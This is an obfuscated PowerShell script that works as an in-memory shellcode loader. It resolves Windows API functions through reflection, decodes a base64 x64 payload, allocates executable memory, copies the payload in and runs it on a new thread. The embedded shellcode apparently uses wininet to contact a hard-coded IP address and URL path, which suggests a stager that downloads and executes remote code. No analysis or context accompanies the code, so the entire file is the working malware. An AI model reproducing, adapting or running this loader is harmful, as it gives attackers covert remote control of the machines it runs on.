function wJbzGz0RMBb3 {
	Param ($qHmwaV9, $bl7lSHRsLMHS)		
	$obKx66T = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $obKx66T.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($obKx66T.GetMethod('GetModuleHandle')).Invoke($null, @($qHmwaV9)))), $bl7lSHRsLMHS))
}

function yWi {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $arnHC11JN,
		[Parameter(Position = 1)] [Type] $wAmkW_g = [Void]
	)
	
	$i5ZXWa8m = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$i5ZXWa8m.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $arnHC11JN).SetImplementationFlags('Runtime, Managed')
	$i5ZXWa8m.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $wAmkW_g, $arnHC11JN).SetImplementationFlags('Runtime, Managed')
	
	return $i5ZXWa8m.CreateType()
}

[Byte[]]$svu = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A8AAAAyMDUuMjA5LjE4MS43OQBaSInBScfAuwEAAE0xyVNTagNTSbpXiZ/GAAAAAP/V6AcAAAAvMTk1UG0ASInBU1pBWE0xyVNIuAAyoIQAAAAAUFNTScfC61UuO//VSInGagpfSInxah9aUmiAMwAASYngagRBWUm6dUaehgAAAAD/1UiJ8VNaTTHATTHJU1NJx8ItBhh7/9WFwHUQSP/PdALrwEnHwvC1olb/1VNZakBaSYnRweIQScfAABAAAEm6WKRT5QAAAAD/1UiTU1NIiedIifFIidpJx8AAIAAASYn5SboSloniAAAAAP/VSIPEIIXAdK5miwdIAcOFwHXSWFjD")
		
$qaEgZcHgQ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((wJbzGz0RMBb3 kernel32.dll VirtualAlloc), (yWi @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $svu.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($svu, 0, $qaEgZcHgQ, $svu.length)

$vRWPHXUo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((wJbzGz0RMBb3 kernel32.dll CreateThread), (yWi @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$qaEgZcHgQ,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((wJbzGz0RMBb3 kernel32.dll WaitForSingleObject), (yWi @([IntPtr], [Int32]))).Invoke($vRWPHXUo,0xffffffff) | Out-Null